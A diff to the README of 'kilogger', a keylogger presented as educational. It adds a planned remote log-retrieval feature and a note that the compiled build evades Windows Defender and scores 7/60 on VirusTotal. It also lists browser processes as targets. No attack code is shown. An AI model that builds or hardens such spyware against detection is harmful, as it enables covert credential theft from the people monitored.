@@ -6,6 +6,7 @@ This is an educational purpose keylogger.
 - [x] Capture and log pressed keys.
 - [x] Watch processes to trigger keylogger.
 - [ ] Log clipboard.
+- [ ] Acquire logs from remote.
 
 ## Installation
 Execute:  `pip install -r requirements.txt`
@@ -27,8 +28,12 @@ options:
   --targets TARGETS  Name of target processes (ex. "chrome.exe, firefox.exe"); note: process names should be separated by ", ".
 ```
 
-## [VirusTotal](https://www.virustotal.com/gui/home/upload) score
+## AV Detection
+On [VirusTotal](https://www.virustotal.com/gui/home/upload) the score for `cli.py` file is the following:
+
 <img src="./static/virus_total_score.PNG" style="width:102px;height:102px"/>
+
+For the compiled version I will add a `COMPILE.md`, right now it doesn't get detected by Windows Defender, but has a score of 7/60 on VirusTotal.
 
 ## Disclaimer
 **kilogger** is for educational purposes only. It's not intended for malicious use or unauthorized access. 
